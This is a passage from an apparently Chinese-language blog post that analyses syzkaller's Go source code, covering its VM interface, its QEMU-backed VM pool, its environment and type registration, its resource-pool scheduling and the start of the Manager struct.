&lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose 从 VM 上检索额外的调试信息</span><br><span class="hljs-comment">// (例如通过发送一些 sys-rq&#x27;s 或 SIGABORT&#x27;ing 一个 Go 程序).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 选择性地直接返回 (一些或所有) 信息. 若 wait == true,</span><br><span class="hljs-comment">// 调用者必须等待 VM 直接输出信息到其日志.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep 描述了 Diagnose 被调用的原因.</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close 停止并销毁 VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名.</li><li><code>Forward()</code>：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址</li><li><code>Run()</code>：在虚拟机内执行命令</li><li><code>Diagnose()</code>：在虚拟机上检索额外的调试信息</li><li><code>Close()</code>：停止并销毁虚拟机</li></ul><p>需要注意的是<strong>不同类型的 Guest VM 所实现的 Interface 接口是不同的</strong></p><blockquote><p>以 QEMU 为例，其实现主要位于 <code>vm/qemu/qemu.go</code> 中</p></blockquote><h3 id="2-Pool：VM-池"><a href="#2-Pool：VM-池" class="headerlink" title="2.Pool：VM 池"></a>2.Pool：VM 池</h3><p>类似于线程池的概念，在 <code>syz-manager</code> 中使用一个 <strong>VM 池</strong> —— <code>Pool</code> 结构体来管控 Guest VM，该结构体定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该结构体实现了 <code>Pool</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool 表示了一组特定类型的测试机器 (虚拟机, 物理设备, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count 返回池中所有 VM 的数量.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create 创建并启动一个新的 VM 实例.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>：返回池中所有 VM 的数量</li><li><code>Create()</code>：<strong>新建并启动一个 VM实例</strong>，返回新建的实例对象</li></ul><h4 id="QEMU-VM-浅析"><a href="#QEMU-VM-浅析" class="headerlink" title="QEMU VM 浅析"></a>QEMU VM 浅析</h4><p>以 QEMU 为例的 Pool 接口实现如下，对于 <code>Count()</code> 而言会直接返回配置文件中的计数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> 则会首先检查文件系统镜像是否为 <code>9p</code> 格式，若是则会生成一个 ssh key 存放到 <code>key</code> 文件中并生成一个 <code>init.sh</code> 文件；接下来就是调用 <code>ctor()</code> 函数创建虚拟机：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> 的实现比较简单，主要就是创建一个带着 ssh key 及一些配置信息与一个 channel 的 <code>instance</code> 实例，初始化实例内的管道并调用 <code>boot()</code> 函数进行正式的创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> 函数主要就是各种参数判断，之后<strong>把 QEMU 起了以后 ssh 连上去</strong>，这里就不摘抄代码了：）</p><h3 id="3-Env：单个-VM-Pool-的环境变量"><a href="#3-Env：单个-VM-Pool-的环境变量" class="headerlink" title="3. Env：单个  VM Pool 的环境变量"></a>3. Env：单个  VM Pool 的环境变量</h3><p><code>Env</code> 结构体为用于一个 VM Pool 的环境变量，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env 包含了用于 VM 池的全局常量参数.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// 独特的名字</span><br><span class="hljs-comment">// 若几个 Pool 共享了全局命名空间则可被用于 VM name 的冲突解决</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-序列化的 VM-类型-特定配置</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Type：VM-类型"><a href="#4-Type：VM-类型" class="headerlink" title="4. Type：VM 类型"></a>4. Type：VM 类型</h3><p>一个 VM Pool 中只能有一种类型的 VM，因而不同类型的 VM 的 Pool 应当要有不同的构造函数，在 <code>syz-manager</code> 中使用 <code>Type</code> 结构体表示一种 VM 的类型信息，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> 为构造函数类型，其接受一个 <code>Env</code> 类型的结构体指针（储存了全局的一些基本信息），并返回一个 VM Pool 实例</p><p>由一个全局的 <code>string→Type</code> 映射表存储了不同类型 VM 的信息，在正式启动之前程序会通过 <code>Register()</code> 函数将不同类型的 VM 信息注册到该表中，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register 在包中注册一个新的 VM 类型.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>以 <code>QEMU</code> 为例，其在包被导入时注册构造函数，主要是调用 <code>LoadData()</code> 解析配置文件后进行检查，这里不再赘叙：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePool：VM-资源池队列"><a href="#5-ResourcePool：VM-资源池队列" class="headerlink" title="5. ResourcePool：VM 资源池队列"></a>5. ResourcePool：VM 资源池队列</h3><p>Guest VM 的资源调配主要是通过<code>ResourcePool</code> 这一结构来完成的，这实际上是一个 <strong>存放空闲 VM の idx 的单向队列，决定了 VM 的调度顺序</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要定义了这些方法来操纵资源池队列：</p><ul><li><code>Put()</code> ：向队列末尾添加空闲 VM の idx</li><li><code>Len()</code> ：获取队列长度</li><li><code>Take()</code>：从队列首部取出 <code>cnt</code> 个成员</li><li><code>TakeOne()</code> ：从队列首部取出单个成员</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>同时有一个 <code>SequentialResourcePool()</code> 函数用以初始化资源池：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Manager：基本信息"><a href="#1-Manager：基本信息" class="headerlink" title="1. Manager：基本信息"></a>1. Manager：基本信息</h3><p><code>Manager</code> 结构体用于<strong>表示一个 syz-manager 的基本信息</strong>，定义于 <code>syz-manager/manager.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span 